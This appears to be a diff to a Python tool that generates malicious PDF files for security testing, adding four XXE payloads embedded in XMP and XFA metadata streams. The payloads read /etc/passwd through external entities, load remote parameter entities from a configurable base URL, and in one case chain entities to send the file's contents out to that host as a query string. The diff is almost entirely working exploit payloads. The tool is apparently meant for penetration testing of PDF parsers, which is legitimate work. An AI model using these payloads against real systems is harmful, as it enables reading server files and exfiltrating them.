@@ -1391,6 +1391,234 @@ startxref
     if should_generate_type('xxe'):
         with open(xxe_dir / "xxe15_xfa.pdf", 'wb') as f:
             f.write(pdf_xxe15_xfa.encode())
+        
+        pdf_xxe16_xmp_param = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Metadata 3 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Metadata
+/Subtype /XML
+/Length 400
+>>
+stream
+<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
+<!DOCTYPE x [
+<!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-param">
+%remote;
+]>
+<x:xmpmeta xmlns:x="adobe:ns:meta/">
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+<rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/">
+<xmp:CreatorTool>&data;</xmp:CreatorTool>
+</rdf:Description>
+</rdf:RDF>
+</x:xmpmeta>
+<?xpacket end="w"?>
+endstream
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+        with open(xxe_dir / "xxe16_xmp_param.pdf", 'wb') as f:
+            f.write(pdf_xxe16_xmp_param.encode())
+        
+        pdf_xxe17_xmp_file = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Metadata 3 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Metadata
+/Subtype /XML
+/Length 300
+>>
+stream
+<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
+<!DOCTYPE x [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<x:xmpmeta xmlns:x="adobe:ns:meta/">
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+<rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/">
+<xmp:CreatorTool>&xxe;</xmp:CreatorTool>
+</rdf:Description>
+</rdf:RDF>
+</x:xmpmeta>
+<?xpacket end="w"?>
+endstream
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+        with open(xxe_dir / "xxe17_xmp_file.pdf", 'wb') as f:
+            f.write(pdf_xxe17_xmp_file.encode())
+        
+        pdf_xxe18_xmp_nested = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Metadata 3 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Metadata
+/Subtype /XML
+/Length 500
+>>
+stream
+<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
+<!DOCTYPE x [
+<!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-nested">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-xmp-exfil?data=%file;'>">
+%remote;
+%eval;
+%exfil;
+]>
+<x:xmpmeta xmlns:x="adobe:ns:meta/">
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+<rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/">
+<xmp:CreatorTool>Test</xmp:CreatorTool>
+</rdf:Description>
+</rdf:RDF>
+</x:xmpmeta>
+<?xpacket end="w"?>
+endstream
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+        with open(xxe_dir / "xxe18_xmp_nested.pdf", 'wb') as f:
+            f.write(pdf_xxe18_xmp_nested.encode())
+        
+        pdf_xxe19_xfa_param = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/AcroForm <<
+/XFA 3 0 R
+>>
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Length 400
+>>
+stream
+<?xml version="1.0"?>
+<!DOCTYPE x [
+<!ENTITY % remote SYSTEM "{base_url}/xfa-xxe-param">
+%remote;
+]>
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+<template>
+<field name="test">&data;</field>
+</template>
+</xdp:xdp>
+endstream
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+        with open(xxe_dir / "xxe19_xfa_param.pdf", 'wb') as f:
+            f.write(pdf_xxe19_xfa_param.encode())
     
     pdf_rce1_ghostscript = f'''%PDF-1.4
 1 0 obj
